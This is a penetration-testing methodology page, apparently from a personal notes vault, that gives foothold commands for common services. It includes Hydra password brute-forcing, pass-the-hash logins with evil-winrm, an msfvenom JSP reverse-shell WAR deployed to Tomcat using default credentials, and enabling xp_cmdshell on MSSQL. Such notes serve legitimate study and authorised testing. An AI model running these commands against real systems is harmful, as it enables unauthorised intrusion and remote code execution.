---
title: "02 — Foothold"
date: 2025-01-01
categories:
  - Tools & Methodologies
  - Methodology
tags: [Methodology, Foothold, Exploitation, CVE, FTP, SSH, WinRM, Tomcat]
description: "Foothold phase methodology — service-based entry points, CVE exploitation workflow, default credential checks, and web application entry vectors."
---

> 📁 **Source:** [github.com/sireton/pentest-vault/02-Foothold](https://github.com/sireton/pentest-vault)  
> ← [Back to Methodology Index](/posts/methodology-index/)

---

#foothold #phase

## Checklist
- [ ] Review all open services from recon
- [ ] Check default/weak credentials on all services
- [ ] Search for known CVEs (searchsploit, ExploitDB, NVD)
- [ ] Check for anonymous access (FTP, SMB, NFS, LDAP)
- [ ] Review any web applications found
- [ ] Check for exposed sensitive files/endpoints
- [ ] Test for common web vulns if web app present

---

## Service-Based Entry Points

### FTP (Port 21)
```bash
ftp <IP>   # user: anonymous, pass: anything
wget -r ftp://<IP>/ --ftp-user=anonymous --ftp-password=anon
hydra -l <user> -P /usr/share/wordlists/rockyou.txt ftp://<IP>
```

### SSH (Port 22)
```bash
hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://<IP>
ssh -i id_rsa user@<IP>
ssh -v user@<IP>   # Enum auth methods
```

### WinRM (Port 5985/5986)
```bash
evil-winrm -i <IP> -u <user> -p <password>
evil-winrm -i <IP> -u <user> -H <NTLMhash>
```

### Tomcat (Port 8080)
```bash
# Default creds: admin:admin, tomcat:tomcat, admin:s3cret
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=4444 -f war -o shell.war
curl -u 'tomcat:s3cret' -T shell.war 'http://<IP>:8080/manager/text/deploy?path=/shell'
```

### MSSQL (Port 1433)
```bash
impacket-mssqlclient <user>:<pass>@<IP>
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

### MySQL (Port 3306)
```bash
mysql -u root -p -h <IP>
SHOW databases;
USE <db>; SHOW tables;
SELECT * FROM users;
```

---

## CVE Exploitation Workflow
```bash
searchsploit <service> <version>
searchsploit -m <EDB-ID>
# Metasploit: msfconsole → search → use → set RHOSTS → run
```

---
*See also: [[06-Web-Attacks/Web Attacks Index]] | [[01-Recon/Recon Index]]*


---

*Previous: [Methodology Recon](/posts/methodology-recon/) · Next: [Methodology Post Exploitation](/posts/methodology-post-exploitation/)*
